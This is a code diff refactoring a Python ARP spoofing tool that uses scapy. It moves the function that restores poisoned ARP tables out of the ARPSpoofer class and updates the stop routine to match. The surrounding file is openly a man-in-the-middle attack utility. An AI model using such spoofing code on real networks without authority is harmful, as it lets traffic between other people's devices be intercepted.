@@ -27,6 +27,13 @@ def spoof(target_ip: str, gateway_ip: str) -> None:
     scapy.send(packet, verbose=False)
 
 
+def restore(destination_ip: str, source_ip: str) -> None:
+    """Restore connection between two devices to its original flow."""
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip),
+                       psrc=source_ip, hwsrc=get_mac(source_ip))
+    scapy.send(packet, count=4, verbose=False)
+
+
 class ARPSpoofer:
     """Manage ARP spoofing between two selected devices on the network.
 
@@ -45,12 +52,6 @@ class ARPSpoofer:
         self.target_ip = target_ip
         self.gateway_ip = gateway_ip
         self.running = False
-
-    def restore(self, destination_ip: str, source_ip: str) -> None:
-        """Restore connection between two devices to its original flow."""
-        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip),
-                           psrc=source_ip, hwsrc=get_mac(source_ip))
-        scapy.send(packet, count=4, verbose=False)
 
     def get_default_gateway(self) -> str:
         """Take target's IP address and return the default gateway's IP address based on that (naive approach)."""
@@ -81,5 +82,5 @@ class ARPSpoofer:
     def stop_spoofing(self) -> None:
         """Stop ARP spoofing by sending forged packets that will restore network flow to the one before spoofing."""
         self.running = False
-        self.restore(self.target_ip, self.gateway_ip)
-        self.restore(self.gateway_ip, self.target_ip)
+        restore(self.target_ip, self.gateway_ip)
+        restore(self.gateway_ip, self.target_ip)
